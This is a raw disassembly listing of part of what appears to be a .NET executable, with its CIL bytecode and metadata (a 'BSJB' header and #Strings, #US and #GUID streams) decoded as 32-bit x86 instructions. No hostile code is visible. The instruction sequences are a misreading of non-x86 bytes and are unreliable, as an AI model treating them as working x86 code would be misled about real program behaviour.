  4040ea:	07                   	pop    %es
  4040eb:	00 70 73             	add    %dh,0x73(%eax)
  4040ee:	e5 00                	in     $0x0,%eax
  4040f0:	00 0a                	add    %cl,(%edx)
  4040f2:	7a 00                	jp     0x4040f4
  4040f4:	de 0d 11 04 2c 08    	fimuls 0x82c0411
  4040fa:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4040fd:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404102:	dc 1f                	fcompl (%edi)
  404104:	10 8d 59 00 00 01    	adc    %cl,0x1000059(%ebp)
  40410a:	0d 07 09 16 1f       	or     $0x1f160907,%eax
  40410f:	10 6f 41             	adc    %ch,0x41(%edi)
  404112:	00 00                	add    %al,(%eax)
  404114:	0a 26                	or     (%esi),%ah
  404116:	08 09                	or     %cl,(%ecx)
  404118:	6f                   	outsl  %ds:(%esi),(%dx)
  404119:	e6 00                	out    %al,$0x0
  40411b:	00 0a                	add    %cl,(%edx)
  40411d:	00 07                	add    %al,(%edi)
  40411f:	08 6f e7             	or     %ch,-0x19(%edi)
  404122:	00 00                	add    %al,(%eax)
  404124:	0a 16                	or     (%esi),%dl
  404126:	73 de                	jae    0x404106
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 13                	or     (%ebx),%dl
  40412c:	08 00                	or     %al,(%eax)
  40412e:	07                   	pop    %es
  40412f:	6f                   	outsl  %ds:(%esi),(%dx)
  404130:	e8 00 00 0a 1f       	call   0x1f4a4135
  404135:	10 6a 59             	adc    %ch,0x59(%edx)
  404138:	17                   	pop    %ss
  404139:	6a 58                	push   $0x58
  40413b:	d4 8d                	aam    $0x8d
  40413d:	59                   	pop    %ecx
  40413e:	00 00                	add    %al,(%eax)
  404140:	01 13                	add    %edx,(%ebx)
  404142:	09 11                	or     %edx,(%ecx)
  404144:	08 11                	or     %dl,(%ecx)
  404146:	09 16                	or     %edx,(%esi)
  404148:	11 09                	adc    %ecx,(%ecx)
  40414a:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40414d:	41                   	inc    %ecx
  40414e:	00 00                	add    %al,(%eax)
  404150:	0a 8d 59 00 00 01    	or     0x1000059(%ebp),%cl
  404156:	13 0a                	adc    (%edx),%ecx
  404158:	11 09                	adc    %ecx,(%ecx)
  40415a:	16                   	push   %ss
  40415b:	11 0a                	adc    %ecx,(%edx)
  40415d:	16                   	push   %ss
  40415e:	11 0a                	adc    %ecx,(%edx)
  404160:	8e 69 28             	mov    0x28(%ecx),%gs
  404163:	e9 00 00 0a 00       	jmp    0x4a4168
  404168:	11 0a                	adc    %ecx,(%edx)
  40416a:	13 0b                	adc    (%ebx),%ecx
  40416c:	de 23                	fisubs (%ebx)
  40416e:	11 08                	adc    %ecx,(%eax)
  404170:	2c 08                	sub    $0x8,%al
  404172:	11 08                	adc    %ecx,(%eax)
  404174:	6f                   	outsl  %ds:(%esi),(%dx)
  404175:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40417a:	dc 08                	fmull  (%eax)
  40417c:	2c 07                	sub    $0x7,%al
  40417e:	08 6f 2d             	or     %ch,0x2d(%edi)
  404181:	00 00                	add    %al,(%eax)
  404183:	0a 00                	or     (%eax),%al
  404185:	dc 07                	faddl  (%edi)
  404187:	2c 07                	sub    $0x7,%al
  404189:	07                   	pop    %es
  40418a:	6f                   	outsl  %ds:(%esi),(%dx)
  40418b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404190:	dc 11                	fcoml  (%ecx)
  404192:	0b 2a                	or     (%edx),%ebp
  404194:	41                   	inc    %ecx
  404195:	64 00 00             	add    %al,%fs:(%eax)
  404198:	02 00                	add    (%eax),%al
  40419a:	00 00                	add    %al,(%eax)
  40419c:	65 00 00             	add    %al,%gs:(%eax)
  40419f:	00 55 00             	add    %dl,0x0(%ebp)
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	ba 00 00 00 0d       	mov    $0xd000000,%edx
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	00 00                	add    %al,(%eax)
  4041ad:	00 00                	add    %al,(%eax)
  4041af:	00 02                	add    %al,(%edx)
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	00 f1                	add    %dh,%cl
  4041b5:	00 00                	add    %al,(%eax)
  4041b7:	00 41 00             	add    %al,0x0(%ecx)
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	32 01                	xor    (%ecx),%al
  4041be:	00 00                	add    %al,(%eax)
  4041c0:	0d 00 00 00 00       	or     $0x0,%eax
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 02                	add    %al,(%edx)
  4041c9:	00 00                	add    %al,(%eax)
  4041cb:	00 22                	add    %ah,(%edx)
  4041cd:	00 00                	add    %al,(%eax)
  4041cf:	00 1d 01 00 00 3f    	add    %bl,0x3f000001
  4041d5:	01 00                	add    %eax,(%eax)
  4041d7:	00 0b                	add    %cl,(%ebx)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	00 00                	add    %al,(%eax)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	00 02                	add    %al,(%edx)
  4041e1:	00 00                	add    %al,(%eax)
  4041e3:	00 1b                	add    %bl,(%ebx)
  4041e5:	00 00                	add    %al,(%eax)
  4041e7:	00 2f                	add    %ch,(%edi)
  4041e9:	01 00                	add    %eax,(%eax)
  4041eb:	00 4a 01             	add    %cl,0x1(%edx)
  4041ee:	00 00                	add    %al,(%eax)
  4041f0:	0b 00                	or     (%eax),%eax
  4041f2:	00 00                	add    %al,(%eax)
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	13 30                	adc    (%eax),%esi
  4041fa:	03 00                	add    (%eax),%eax
  4041fc:	30 00                	xor    %al,(%eax)
  4041fe:	00 00                	add    %al,(%eax)
  404200:	1b 00                	sbb    (%eax),%eax
  404202:	00 11                	add    %dl,(%ecx)
  404204:	00 17                	add    %dl,(%edi)
  404206:	0a 16                	or     (%esi),%dl
  404208:	0b 2b                	or     (%ebx),%ebp
  40420a:	17                   	pop    %ss
  40420b:	00 03                	add    %al,(%ebx)
  40420d:	07                   	pop    %es
  40420e:	91                   	xchg   %eax,%ecx
  40420f:	04 07                	add    $0x7,%al
  404211:	91                   	xchg   %eax,%ecx
  404212:	fe 01                	incb   (%ecx)
  404214:	16                   	push   %ss
  404215:	fe 01                	incb   (%ecx)
  404217:	0c 08                	or     $0x8,%al
  404219:	2c 02                	sub    $0x2,%al
  40421b:	16                   	push   %ss
  40421c:	0a 00                	or     (%eax),%al
  40421e:	07                   	pop    %es
  40421f:	17                   	pop    %ss
  404220:	58                   	pop    %eax
  404221:	0b 07                	or     (%edi),%eax
  404223:	03 8e 69 fe 04 0d    	add    0xd04fe69(%esi),%ecx
  404229:	09 2d df 06 13 04    	or     %ebp,0x41306df
  40422f:	2b 00                	sub    (%eax),%eax
  404231:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  404234:	62 1f                	bound  %ebx,(%edi)
  404236:	20 8d 59 00 00 01    	and    %cl,0x1000059(%ebp)
  40423c:	25 d0 28 00 00       	and    $0x28d0,%eax
  404241:	04 28                	add    $0x28,%al
  404243:	ea 00 00 0a 80 27 00 	ljmp   $0x27,$0x800a0000
  40424a:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40424d:	00 00                	add    %al,(%eax)
  40424f:	00 1b                	add    %bl,(%ebx)
  404251:	30 03                	xor    %al,(%ebx)
  404253:	00 70 00             	add    %dh,0x0(%eax)
  404256:	00 00                	add    %al,(%eax)
  404258:	1c 00                	sbb    $0x0,%al
  40425a:	00 11                	add    %dl,(%ecx)
  40425c:	00 28                	add    %ch,(%eax)
  40425e:	17                   	pop    %ss
  40425f:	00 00                	add    %al,(%eax)
  404261:	0a 02                	or     (%edx),%al
  404263:	6f                   	outsl  %ds:(%esi),(%dx)
  404264:	18 00                	sbb    %al,(%eax)
  404266:	00 0a                	add    %cl,(%edx)
  404268:	0a 73 eb             	or     -0x15(%ebx),%dh
  40426b:	00 00                	add    %al,(%eax)
  40426d:	0a 0c 00             	or     (%eax,%eax,1),%cl
  404270:	08 06                	or     %al,(%esi)
  404272:	6f                   	outsl  %ds:(%esi),(%dx)
  404273:	8f 00                	pop    (%eax)
  404275:	00 0a                	add    %cl,(%edx)
  404277:	0a 00                	or     (%eax),%al
  404279:	de 0b                	fimuls (%ebx)
  40427b:	08 2c 07             	or     %ch,(%edi,%eax,1)
  40427e:	08 6f 2d             	or     %ch,0x2d(%edi)
  404281:	00 00                	add    %al,(%eax)
  404283:	0a 00                	or     (%eax),%al
  404285:	dc 73 90             	fdivl  -0x70(%ebx)
  404288:	00 00                	add    %al,(%eax)
  40428a:	0a 0b                	or     (%ebx),%cl
  40428c:	00 06                	add    %al,(%esi)
  40428e:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  404293:	1f                   	pop    %ds
  404294:	09 11                	or     %edx,(%ecx)
  404296:	04 91                	add    $0x91,%al
  404298:	13 05 07 12 05 72    	adc    0x72051207,%eax
  40429e:	8d 07                	lea    (%edi),%eax
  4042a0:	00 70 28             	add    %dh,0x28(%eax)
  4042a3:	91                   	xchg   %eax,%ecx
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	0a 6f 92             	or     -0x6e(%edi),%ch
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	0a 26                	or     (%esi),%ah
  4042ad:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4042b0:	58                   	pop    %eax
  4042b1:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4042b4:	04 09                	add    $0x9,%al
  4042b6:	8e 69 32             	mov    0x32(%ecx),%gs
  4042b9:	da 07                	fiaddl (%edi)
  4042bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4042bc:	33 00                	xor    (%eax),%eax
  4042be:	00 0a                	add    %cl,(%edx)
  4042c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4042c1:	94                   	xchg   %eax,%esp
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	0a 13                	or     (%ebx),%dl
  4042c6:	06                   	push   %es
  4042c7:	2b 00                	sub    (%eax),%eax
  4042c9:	11 06                	adc    %eax,(%esi)
  4042cb:	2a 01                	sub    (%ecx),%al
  4042cd:	10 00                	adc    %al,(%eax)
  4042cf:	00 02                	add    %al,(%edx)
  4042d1:	00 13                	add    %dl,(%ebx)
  4042d3:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  4042d6:	00 0b                	add    %cl,(%ebx)
  4042d8:	00 00                	add    %al,(%eax)
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	1b 30                	sbb    (%eax),%esi
  4042de:	02 00                	add    (%eax),%al
  4042e0:	1f                   	pop    %ds
  4042e1:	00 00                	add    %al,(%eax)
  4042e3:	00 1d 00 00 11 00    	add    %bl,0x110000
  4042e9:	73 eb                	jae    0x4042d6
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 0a                	or     (%edx),%cl
  4042ef:	00 06                	add    %al,(%esi)
  4042f1:	02 6f 8f             	add    -0x71(%edi),%ch
  4042f4:	00 00                	add    %al,(%eax)
  4042f6:	0a 0b                	or     (%ebx),%cl
  4042f8:	de 0b                	fimuls (%ebx)
  4042fa:	06                   	push   %es
  4042fb:	2c 07                	sub    $0x7,%al
  4042fd:	06                   	push   %es
  4042fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ff:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404304:	dc 07                	faddl  (%edi)
  404306:	2a 00                	sub    (%eax),%al
  404308:	01 10                	add    %edx,(%eax)
  40430a:	00 00                	add    %al,(%eax)
  40430c:	02 00                	add    (%eax),%al
  40430e:	07                   	pop    %es
  40430f:	00 0b                	add    %cl,(%ebx)
  404311:	12 00                	adc    (%eax),%al
  404313:	0b 00                	or     (%eax),%eax
  404315:	00 00                	add    %al,(%eax)
  404317:	00 42 53             	add    %al,0x53(%edx)
  40431a:	4a                   	dec    %edx
  40431b:	42                   	inc    %edx
  40431c:	01 00                	add    %eax,(%eax)
  40431e:	01 00                	add    %eax,(%eax)
  404320:	00 00                	add    %al,(%eax)
  404322:	00 00                	add    %al,(%eax)
  404324:	0c 00                	or     $0x0,%al
  404326:	00 00                	add    %al,(%eax)
  404328:	76 34                	jbe    0x40435e
  40432a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40432d:	33 30                	xor    (%eax),%esi
  40432f:	33 31                	xor    (%ecx),%esi
  404331:	39 00                	cmp    %eax,(%eax)
  404333:	00 00                	add    %al,(%eax)
  404335:	00 05 00 6c 00 00    	add    %al,0x6c00
  40433b:	00 00                	add    %al,(%eax)
  40433d:	15 00 00 23 7e       	adc    $0x7e230000,%eax
  404342:	00 00                	add    %al,(%eax)
  404344:	6c                   	insb   (%dx),%es:(%edi)
  404345:	15 00 00 d8 18       	adc    $0x18d80000,%eax
  40434a:	00 00                	add    %al,(%eax)
  40434c:	23 53 74             	and    0x74(%ebx),%edx
  40434f:	72 69                	jb     0x4043ba
  404351:	6e                   	outsb  %ds:(%esi),(%dx)
  404352:	67 73 00             	addr16 jae 0x404355
  404355:	00 00                	add    %al,(%eax)
  404357:	00 44 2e 00          	add    %al,0x0(%esi,%ebp,1)
  40435b:	00 94 07 00 00 23 55 	add    %dl,0x55230000(%edi,%eax,1)
  404362:	53                   	push   %ebx
  404363:	00 d8                	add    %bl,%al
  404365:	35 00 00 10 00       	xor    $0x100000,%eax
  40436a:	00 00                	add    %al,(%eax)
  40436c:	23 47 55             	and    0x55(%edi),%eax
  40436f:	49                   	dec    %ecx
  404370:	44                   	inc    %esp
  404371:	00 00                	add    %al,(%eax)
  404373:	00 e8                	add    %ch,%al
  404375:	35 00 00 38 07       	xor    $0x7380000,%eax
  40437a:	00 00                	add    %al,(%eax)
  40437c:	23 42 6c             	and    0x6c(%edx),%eax
  40437f:	6f                   	outsl  %ds:(%esi),(%dx)
  404380:	62 00                	bound  %eax,(%eax)
  404382:	00 00                	add    %al,(%eax)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 00                	add    %al,(%eax)
  404388:	02 00                	add    (%eax),%al
  40438a:	00 01                	add    %al,(%ecx)
  40438c:	57                   	push   %edi
  40438d:	9d                   	popf
  40438e:	a2 3d 09 0a 00       	mov    %al,0xa093d
  404393:	00 00                	add    %al,(%eax)
  404395:	fa                   	cli
  404396:	01 33                	add    %esi,(%ebx)
  404398:	00 16                	add    %dl,(%esi)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	01 00                	add    %eax,(%eax)
  40439e:	00 00                	add    %al,(%eax)
  4043a0:	95                   	xchg   %eax,%ebp
  4043a1:	00 00                	add    %al,(%eax)
  4043a3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4043a6:	00 00                	add    %al,(%eax)
  4043a8:	2d 00 00 00 53       	sub    $0x53000000,%eax
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	00 31                	add    %dh,(%ecx)
  4043b1:	00 00                	add    %al,(%eax)
  4043b3:	00 eb                	add    %ch,%bl
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	00 07                	add    %al,(%edi)
  4043b9:	00 00                	add    %al,(%eax)
  4043bb:	00 3a                	add    %bh,(%edx)
  4043bd:	00 00                	add    %al,(%eax)
  4043bf:	00 01                	add    %al,(%ecx)
  4043c1:	00 00                	add    %al,(%eax)
  4043c3:	00 1d 00 00 00 01    	add    %bl,0x1000000
  4043c9:	00 00                	add    %al,(%eax)
  4043cb:	00 0b                	add    %cl,(%ebx)
  4043cd:	00 00                	add    %al,(%eax)
  4043cf:	00 15 00 00 00 03    	add    %dl,0x3000000
  4043d5:	00 00                	add    %al,(%eax)
  4043d7:	00 06                	add    %al,(%esi)
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	00 06                	add    %al,(%esi)
  4043dd:	00 00                	add    %al,(%eax)
  4043df:	00 01                	add    %al,(%ecx)
  4043e1:	00 00                	add    %al,(%eax)
  4043e3:	00 01                	add    %al,(%ecx)
  4043e5:	00 00                	add    %al,(%eax)
  4043e7:	00 09                	add    %cl,(%ecx)
  4043e9:	00 00                	add    %al,(%eax)
  4043eb:	00 03                	add    %al,(%ebx)
  4043ed:	00 00                	add    %al,(%eax)
  4043ef:	00 01                	add    %al,(%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 00                	add    %al,(%eax)
  4043f5:	00 52 09             	add    %dl,0x9(%edx)
  4043f8:	01 00                	add    %eax,(%eax)
  4043fa:	00 00                	add    %al,(%eax)
  4043fc:	00 00                	add    %al,(%eax)
  4043fe:	06                   	push   %es
  4043ff:	00 67 08             	add    %ah,0x8(%edi)
  404402:	73 12                	jae    0x404416
  404404:	06                   	push   %es
  404405:	00 d4                	add    %dl,%ah
  404407:	08 73 12             	or     %dh,0x12(%ebx)
  40440a:	06                   	push   %es
  40440b:	00 80 07 15 12 0f    	add    %al,0xf121507(%eax)
  404411:	00 93 12 00 00 06    	add    %dl,0x6000012(%ebx)
  404417:	00 c3                	add    %al,%bl
  404419:	07                   	pop    %es
  40441a:	ae                   	scas   %es:(%edi),%al
  40441b:	0e                   	push   %cs
  40441c:	06                   	push   %es
  40441d:	00 4a 08             	add    %cl,0x8(%edx)
  404420:	ae                   	scas   %es:(%edi),%al
  404421:	0e                   	push   %cs
  404422:	06                   	push   %es
  404423:	00 2b                	add    %ch,(%ebx)
  404425:	08 ae 0e 06 00 bb    	or     %ch,-0x44fff9f2(%esi)
  40442b:	08 ae 0e 06 00 87    	or     %ch,-0x78fff9f2(%esi)
  404431:	08 ae 0e 06 00 a0    	or     %ch,-0x5ffff9f2(%esi)
  404437:	08 ae 0e 06 00 da    	or     %ch,-0x25fff9f2(%esi)
  40443d:	07                   	pop    %es
  40443e:	ae                   	scas   %es:(%edi),%al
  40443f:	0e                   	push   %cs
  404440:	06                   	push   %es
  404441:	00 af 07 54 12 06    	add    %ch,0x6125407(%edi)
  404447:	00 0e                	add    %cl,(%esi)
  404449:	08 ae 0e 06 00 f5    	or     %ch,-0xafff9f2(%esi)
  40444f:	07                   	pop    %es
  404450:	56                   	push   %esi
  404451:	0a 06                	or     (%esi),%al
  404453:	00 34 15 96 0d 0a 00 	add    %dh,0xa0d96(,%edx,1)
  40445a:	77 00                	ja     0x40445c
  40445c:	db 12                	fistl  (%edx)
  40445e:	06                   	push   %es
  40445f:	00 36                	add    %dh,(%esi)
  404461:	10 2b                	adc    %ch,(%ebx)
  404463:	18 06                	sbb    %al,(%esi)
  404465:	00 49 0f             	add    %cl,0xf(%ecx)
  404468:	96                   	xchg   %eax,%esi
  404469:	0d 06 00 65 07       	or     $0x7650006,%eax
  40446e:	73 12                	jae    0x404482
  404470:	06                   	push   %es
  404471:	00 20                	add    %ah,(%eax)
  404473:	07                   	pop    %es
  404474:	15 12 06 00 94       	adc    $0x94000612,%eax
  404479:	07                   	pop    %es
  40447a:	15 12 0a 00 9a       	adc    $0x9a000a12,%eax
  40447f:	15 b1 14 0a 00       	adc    $0xa14b1,%eax
  404484:	4d                   	dec    %ebp
  404485:	0d a3 18 06 00       	or     $0x618a3,%eax
  40448a:	32 11                	xor    (%ecx),%dl
  40448c:	ec                   	in     (%dx),%al
  40448d:	09 0a                	or     %ecx,(%edx)
  40448f:	00 9c 14 59 15 0a 00 	add    %bl,0xa1559(%esp,%edx,1)
  404496:	ed                   	in     (%dx),%eax
  404497:	15 59 15 0a 00       	adc    $0xa1559,%eax
  40449c:	8c 0c 59             	mov    %cs,(%ecx,%ebx,2)
  40449f:	15 06 00 e3 06       	adc    $0x6e30006,%eax
  4044a4:	db 12                	fistl  (%edx)
  4044a6:	0a 00                	or     (%eax),%al
  4044a8:	17                   	pop    %ss
  4044a9:	0e                   	push   %cs
  4044aa:	db 12                	fistl  (%edx)
  4044ac:	0a 00                	or     (%eax),%al
  4044ae:	61                   	popa
  4044af:	14 a3                	adc    $0xa3,%al
  4044b1:	18 06                	sbb    %al,(%esi)
  4044b3:	00 cf                	add    %cl,%bh
  4044b5:	15 96 0d 06 00       	adc    $0x60d96,%eax
  4044ba:	55                   	push   %ebp
  4044bb:	02 ec                	add    %ah,%ch
  4044bd:	09 06                	or     %eax,(%esi)
  4044bf:	00 64 0d 89          	add    %ah,-0x77(%ebp,%ecx,1)
  4044c3:	01 0e                	add    %ecx,(%esi)
  4044c5:	00 d6                	add    %dl,%dh
  4044c7:	0b bb 0b 06 00 6b    	or     0x6b00060b(%ebx),%edi
  4044cd:	0f 89 01 06 00 34    	jns    0x34404ad4
  4044d3:	0d 89 01 0a 00       	or     $0xa0189,%eax
  4044d8:	94                   	xchg   %eax,%esp
  4044d9:	14 15                	adc    $0x15,%al
  4044db:	12 0a                	adc    (%edx),%cl
  4044dd:	00 ad 0f 15 12 06    	add    %ch,0x612150f(%ebp)
  4044e3:	00 1a                	add    %bl,(%edx)
  4044e5:	18 55 00             	sbb    %dl,0x0(%ebp)
  4044e8:	06                   	push   %es
  4044e9:	00 6d 11             	add    %ch,0x11(%ebp)
  4044ec:	89 01                	mov    %eax,(%ecx)
  4044ee:	12 00                	adc    (%eax),%al
  4044f0:	ff 10                	call   *(%eax)
  4044f2:	55                   	push   %ebp
  4044f3:	16                   	push   %ss
  4044f4:	12 00                	adc    (%eax),%al
  4044f6:	da 0e                	fimull (%esi)
  4044f8:	55                   	push   %ebp
  4044f9:	16                   	push   %ss
  4044fa:	ab                   	stos   %eax,%es:(%edi)
  4044fb:	00 a6 11 00 00 12    	add    %ah,0x12000011(%esi)
  404501:	00 16                	add    %dl,(%esi)
  404503:	15 55 16 06 00       	adc    $0x61655,%eax
  404508:	1d 10 2b 18 06       	sbb    $0x6182b10,%eax
  40450d:	00 68 10             	add    %ch,0x10(%eax)
  404510:	49                   	dec    %ecx
  404511:	17                   	pop    %ss
  404512:	06                   	push   %es
  404513:	00 37                	add    %dh,(%edi)
  404515:	06                   	push   %es
  404516:	96                   	xchg   %eax,%esi
  404517:	0d 06 00 2b 00       	or     $0x2b0006,%eax
  40451c:	05 02 16 00 53       	add    $0x53001602,%eax
  404521:	0f 3f                	(bad)
  404523:	0a 16                	or     (%esi),%dl
  404525:	00 03                	add    %al,(%ebx)
  404527:	15 3f 0a 06 00       	adc    $0x60a3f,%eax
  40452c:	a0 17 ec 09 06       	mov    0x609ec17,%al
  404531:	00 fb                	add    %bh,%bl
  404533:	0d 96 0d 0a 00       	or     $0xa0d96,%eax
  404538:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404539:	13 55 00             	adc    0x0(%ebp),%edx
  40453c:	c3                   	ret
  40453d:	00 c4                	add    %al,%ah
  40453f:	11 00                	adc    %eax,(%eax)
  404541:	00 06                	add    %al,(%esi)
  404543:	00 48 18             	add    %cl,0x18(%eax)
  404546:	ae                   	scas   %es:(%edi),%al
  404547:	0e                   	push   %cs
  404548:	06                   	push   %es
  404549:	00 a9 06 96 0d 1a    	add    %ch,0x1a0d9606(%ecx)
  40454f:	00 20                	add    %ah,(%eax)
  404551:	00 73 12             	add    %dh,0x12(%ebx)
  404554:	1a 00                	sbb    (%eax),%al
  404556:	01 00                	add    %eax,(%eax)
  404558:	96                   	xchg   %eax,%esi
  404559:	0d 1a 00 56 07       	or     $0x756001a,%eax
  40455e:	73 12                	jae    0x404572
  404560:	06                   	push   %es
  404561:	00 16                	add    %dl,(%esi)
  404563:	13 2b                	adc    (%ebx),%ebp
  404565:	18 1a                	sbb    %bl,(%edx)
  404567:	00 4f 10             	add    %cl,0x10(%edi)
  40456a:	2b 18                	sub    (%eax),%ebx
  40456c:	06                   	push   %es
  40456d:	00 57 0d             	add    %dl,0xd(%edi)
  404570:	2b 18                	sub    (%eax),%ebx
  404572:	06                   	push   %es
  404573:	00 94 00 2b 18 06 00 	add    %dl,0x6182b(%eax,%eax,1)
  40457a:	65 02 2b             	add    %gs:(%ebx),%ch
  40457d:	18 06                	sbb    %al,(%esi)
  40457f:	00 84 06 96 0d 06 00 	add    %al,0x60d96(%esi,%eax,1)
  404586:	22 17                	and    (%edi),%dl
  404588:	96                   	xchg   %eax,%esi
  404589:	0d 06 00 67 16       	or     $0x16670006,%eax
  40458e:	96                   	xchg   %eax,%esi
  40458f:	0d 0a 00 fd 17       	or     $0x17fd000a,%eax
  404594:	db 12                	fistl  (%edx)
  404596:	06                   	push   %es
  404597:	00 c1                	add    %al,%cl
  404599:	0d 2b 18 06 00       	or     $0x6182b,%eax
  40459e:	36 0a 49 17          	or     %ss:0x17(%ecx),%cl
  4045a2:	06                   	push   %es
  4045a3:	00 cd                	add    %cl,%ch
  4045a5:	09 2b                	or     %ebp,(%ebx)
  4045a7:	18 0a                	sbb    %cl,(%edx)
  4045a9:	00 51 18             	add    %dl,0x18(%ecx)
  4045ac:	b1 14                	mov    $0x14,%cl
  4045ae:	0a 00                	or     (%eax),%al
  4045b0:	a3 06 b1 14 0a       	mov    %eax,0xa14b106
  4045b5:	00 8e 06 b1 14 06    	add    %cl,0x614b106(%esi)
  4045bb:	00 d1                	add    %dl,%cl
  4045bd:	0a 96 0d 06 00 0b    	or     0xb00060d(%esi),%dl
  4045c3:	10 96 0d 06 00 e3    	adc    %dl,-0x1cfff9f3(%esi)
  4045c9:	0d 96 0d 0a 00       	or     $0xa0d96,%eax
  4045ce:	21 14 59             	and    %edx,(%ecx,%ebx,2)
  4045d1:	15 0a 00 e2 13       	adc    $0x13e2000a,%eax
  4045d6:	59                   	pop    %ecx
  4045d7:	15 06 00 2e 14       	adc    $0x142e0006,%eax
  4045dc:	96                   	xchg   %eax,%esi
  4045dd:	0d 06 00 a7 04       	or     $0x4a70006,%eax
  4045e2:	96                   	xchg   %eax,%esi
  4045e3:	0d 0a 00 27 0b       	or     $0xb27000a,%eax
  4045e8:	15 12 0a 00 3f       	adc    $0x3f000a12,%eax
  4045ed:	0d b1 14 0a 00       	or     $0xa14b1,%eax
  4045f2:	ec                   	in     (%dx),%al
  4045f3:	0b a3 18 06 00 6a    	or     0x6a000618(%ebx),%esp
  4045f9:	0d 89 01 0a 00       	or     $0xa0189,%eax
  4045fe:	c1 16 59             	rcll   $0x59,(%esi)
  404601:	15 0a 00 c0 0e       	adc    $0xec0000a,%eax
  404606:	db 12                	fistl  (%edx)
  404608:	0a 00                	or     (%eax),%al
  40460a:	ff 13                	call   *(%ebx)
  40460c:	8f                   	(bad)
  40460d:	0e                   	push   %cs
  40460e:	06                   	push   %es
  40460f:	00 06                	add    %al,(%esi)
  404611:	09 96 0d 06 00 10    	or     %edx,0x1000060d(%esi)
  404617:	0c ec                	or     $0xec,%al
  404619:	09 06                	or     %eax,(%esi)
  40461b:	00 de                	add    %bl,%dh
  40461d:	0b 96 0d 0a 00 ae    	or     -0x51fff5f3(%esi),%edx
  404623:	0b 96 0d 0a 00 74    	or     0x74000a0d(%esi),%edx
  404629:	06                   	push   %es
  40462a:	96                   	xchg   %eax,%esi
  40462b:	0d 06 00 8b 11       	or     $0x118b0006,%eax
  404630:	96                   	xchg   %eax,%esi
  404631:	0d 06 00 8e 00       	or     $0x8e0006,%eax
  404636:	96                   	xchg   %eax,%esi
  404637:	0d 06 00 09 17       	or     $0x17090006,%eax
  40463c:	ec                   	in     (%dx),%al
  40463d:	09 06                	or     %eax,(%esi)
  40463f:	00 e6                	add    %ah,%dh
  404641:	11 ec                	adc    %ebp,%esp
  404643:	09 0a                	or     %ecx,(%edx)
  404645:	00 5d 04             	add    %bl,0x4(%ebp)
  404648:	b1 14                	mov    $0x14,%cl
  40464a:	06                   	push   %es
  40464b:	00 26                	add    %ah,(%esi)
  40464d:	01 96 0d 06 00 76    	add    %edx,0x7600060d(%esi)
  404653:	0b 89 01 0a 00 5c    	or     0x5c000a01(%ecx),%ecx
  404659:	05 15 12 06 00       	add    $0x61215,%eax
  40465e:	7e 0f                	jle    0x40466f
  404660:	89 01                	mov    %eax,(%ecx)
  404662:	0a 00                	or     (%eax),%al
  404664:	7a 05                	jp     0x40466b
  404666:	15 12 06 00 80       	adc    $0x80000612,%eax
  40466b:	18 55 00             	sbb    %dl,0x0(%ebp)
  40466e:	1e                   	push   %ds
  40466f:	00 8c 13 20 02 06 00 	add    %cl,0x60220(%ebx,%edx,1)
  404676:	2d 0c 55 00 06       	sub    $0x600550c,%eax
  40467b:	00 17                	add    %dl,(%edi)
  40467d:	05 89 01 06 00       	add    $0x60189,%eax
  404682:	1d 04 89 01 06       	sbb    $0x6018904,%eax
  404687:	00 7a 11             	add    %bh,0x11(%edx)
  40468a:	89 01                	mov    %eax,(%ecx)
  40468c:	06                   	push   %es
  40468d:	00 74 0f 89          	add    %dh,-0x77(%edi,%ecx,1)
  404691:	01 1e                	add    %ebx,(%esi)
  404693:	00 8d 0f 36 12 06    	add    %cl,0x612360f(%ebp)
  404699:	00 0e                	add    %cl,(%esi)
  40469b:	12 96 0d 06 00 67    	adc    0x6700060d(%esi),%dl
  4046a1:	00 96 0d 06 00 8d    	add    %dl,-0x72fff9f3(%esi)
  4046a7:	0d 96 0d 06 00       	or     $0x60d96,%eax
  4046ac:	d5 0d                	aad    $0xd
  4046ae:	2b 18                	sub    (%eax),%ebx
  4046b0:	06                   	push   %es
  4046b1:	00 02                	add    %al,(%edx)
  4046b3:	0e                   	push   %cs
  4046b4:	96                   	xchg   %eax,%esi
  4046b5:	0d 22 00 83 0e       	or     $0xe830022,%eax
  4046ba:	0c 14                	or     $0x14,%al
  4046bc:	06                   	push   %es
  4046bd:	00 b7 18 9e 0c 06    	add    %dh,0x60c9e18(%edi)
  4046c3:	00 b8 0c 9e 0c 06    	add    %bh,0x60c9e0c(%eax)
  4046c9:	00 25 05 9e 0c 06    	add    %ah,0x60c9e05
  4046cf:	00 ae 02 96 0d 06    	add    %ch,0x60d9602(%esi)
